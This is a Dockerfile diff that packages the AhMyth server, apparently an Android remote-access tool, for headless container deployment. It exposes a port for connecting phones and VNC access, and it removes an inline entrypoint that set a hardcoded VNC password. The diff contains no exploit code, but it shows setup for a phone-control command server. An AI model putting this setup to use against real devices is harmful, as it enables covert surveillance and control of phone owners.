@@ -5,7 +5,7 @@ FROM node:16-bullseye
 ENV DEBIAN_FRONTEND=noninteractive
 RUN apt-get update && apt-get install -y \
     libnss3 libatk-bridge2.0-0 libcups2 libgtk-3-0 libgbm-dev libasound2 \
-    xvfb x11vnc fluxbox websockify curl wget default-jdk \
+    xvfb x11vnc fluxbox websockify curl wget default-jdk x11-utils \
     apksigner zipalign zlib1g-dev \
     && rm -rf /var/lib/apt/lists/* \
     && mkdir -p /usr/share/novnc \
@@ -14,7 +14,7 @@ RUN apt-get update && apt-get install -y \
 WORKDIR /app
 
 # Cache buster para forzar rebuild
-ARG CACHEBUST=14
+ARG CACHEBUST=15
 
 # Copiamos solo la parte del servidor
 COPY AhMyth-Server/app /app
@@ -32,22 +32,10 @@ RUN cd /app && npm install
 # Instalamos electron de forma global para la ejecución headless
 RUN npm install -g electron@9.2.0
 
-# Creamos el entrypoint INLINE para evitar cache viejo
-RUN printf '#!/bin/bash\n\
-# 1. Iniciar pantalla virtual FULL HD\n\
-Xvfb :99 -screen 0 1920x1080x24 &\n\
-export DISPLAY=:99\n\
-\n\
-# 2. Iniciar administrador de ventanas\n\
-fluxbox &\n\
-\n\
-# 3. Iniciar servidor VNC exclusivo para acceso RealVNC Directo (Puerto 5900)
-# Usamos -rfbport 5900, -shared, -noxdamage y -repeat
-x11vnc -display :99 -forever -passwd "clona123" -rfbport 5900 -shared -noxdamage -repeat &\n\
-\n\
-# 4. Iniciar el servidor de AhMyth (Sin websockify)
-echo "Iniciando Clona Server..."\n\
-electron /app --no-sandbox\n' > /entrypoint.sh && chmod +x /entrypoint.sh
+# Copiamos el entrypoint robusto
+COPY entrypoint.sh /entrypoint.sh
+RUN chmod +x /entrypoint.sh
+
 
 # Puertos: 42474 (Celulares) y 5900 (RealVNC)
 EXPOSE 42474 5900
